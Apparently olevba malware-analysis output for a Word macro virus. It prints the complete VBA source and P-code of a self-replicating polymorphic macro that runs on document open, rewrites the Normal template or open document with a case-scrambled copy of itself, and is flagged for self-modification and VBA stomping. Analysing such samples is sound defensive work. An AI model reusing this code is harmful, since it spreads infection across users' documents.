olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Static
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Static - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub DocuMENT_oPen()
Options.VirusProtection = True 
Options.SaveNormalPrompt = True 
Options.ConfirmConversions = True 
If ThisDocument = NormalTemplate Then Set Target = ActiveDocument Else Set Target = NormalTemplate
Set TarGETmOdUle = Target.VBProject.vBcOMPOneNtS.Item(1).cODEmOduLe
TarGETmOdUle.deLEteliNES 1, TarGETmOdUle.coUntoflINes
TarGETmOdUle.AdDfrOmSTriNG MORPh
If Target = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Private Function MORPh()
hOsT = ThisDocument.VBProject.vBcOMPOneNtS.Item(1).cODEmOduLe.LINEs(1, ThisDocument.VBProject.vBcOMPOneNtS.Item(1).cODEmOduLe.coUntoflINes)
For v1 = 1 To Len(hOsT)
v2 = Asc(Mid(hOsT, v1, 1))
If v2 < 90 And v2 > 65 Then
If Int(Rnd * 11) > 5 Then v2 = v2 + 32
ElseIf v2 < 122 And v2 > 97 Then
If Int(Rnd * 11) > 5 Then v2 = v2 - 32
End If
MORPh = MORPh & Chr(v2)
Next
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Static
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2580 bytes
' Line #0:
' 	FuncDefn (Private Sub DocuMENT_oPen())
' Line #1:
' 	Ld True  
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #2:
' 	Ld True  
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #3:
' 	Ld True  
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #4:
' 	Ld ThisDocument 
' 	Ld NormalTemplate 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Target 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Target 
' 	EndIf 
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Target 
' 	MemLd VBProject 
' 	MemLd vBcOMPOneNtS 
' 	ArgsMemLd Item 0x0001 
' 	MemLd cODEmOduLe 
' 	Set TarGETmOdUle 
' Line #6:
' 	LitDI2 0x0001 
' 	Ld TarGETmOdUle 
' 	MemLd coUntoflINes 
' 	Ld TarGETmOdUle 
' 	ArgsMemCall deLEteliNES 0x0002 
' Line #7:
' 	Ld MORPh 
' 	Ld TarGETmOdUle 
' 	ArgsMemCall AdDfrOmSTriNG 0x0001 
' Line #8:
' 	Ld Target 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #9:
' 	EndSub 
' Line #10:
' 	FuncDefn (Private Function MORPh(id_FFFE As Variant))
' Line #11:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd vBcOMPOneNtS 
' 	ArgsMemLd Item 0x0001 
' 	MemLd cODEmOduLe 
' 	MemLd coUntoflINes 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd vBcOMPOneNtS 
' 	ArgsMemLd Item 0x0001 
' 	MemLd cODEmOduLe 
' 	ArgsMemLd LINEs 0x0002 
' 	St hOsT 
' Line #12:
' 	StartForVariable 
' 	Ld v1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld hOsT 
' 	FnLen 
' 	For 
' Line #13:
' 	Ld hOsT 
' 	Ld v1 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St v2 
' Line #14:
' 	Ld v2 
' 	LitDI2 0x005A 
' 	Lt 
' 	Ld v2 
' 	LitDI2 0x0041 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #15:
' 	Ld Rnd 
' 	LitDI2 0x000B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0005 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld v2 
' 	LitDI2 0x0020 
' 	Add 
' 	St v2 
' 	EndIf 
' Line #16:
' 	Ld v2 
' 	LitDI2 0x007A 
' 	Lt 
' 	Ld v2 
' 	LitDI2 0x0061 
' 	Gt 
' 	And 
' 	ElseIfBlock 
' Line #17:
' 	Ld Rnd 
' 	LitDI2 0x000B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0005 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld v2 
' 	LitDI2 0x0020 
' 	Sub 
' 	St v2 
' 	EndIf 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	Ld MORPh 
' 	Ld v2 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St MORPh 
' Line #20:
' 	StartForVariable 
' 	Next 
' Line #21:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |DocuMENT_oPen       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vBcOMPOneNtS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|cODEmOduLe          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AdDfrOmSTriNG       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

